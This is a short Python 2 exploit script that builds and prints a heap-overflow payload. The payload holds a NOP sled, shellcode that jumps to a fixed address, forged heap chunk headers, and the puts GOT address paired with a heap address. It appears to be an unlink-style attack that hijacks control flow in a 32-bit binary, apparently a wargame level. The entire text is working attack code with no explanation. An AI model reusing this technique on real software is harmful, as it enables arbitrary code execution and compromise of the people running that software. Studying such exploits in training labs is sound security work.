#!/usr/bin/python
from struct import pack as p

putsgot = p("I", 0x0804b128 - 12) #0x08048796
heapaddr = p("I", 0x804c000 + 8)
sc = 'b864880408ffe0'.decode('hex') # mov eax, 0x08048864; jmp eax

s = ''
s += '\x90' * 12
s += sc
s += ' '
s += 'BBBB' * 7
s += p("I", 0xffffffff)
s += p("I", 0xffffffff)
s += p("I", 0xfffffffc)
s += ' '
s += 'D'
s += putsgot
s += heapaddr

print s 
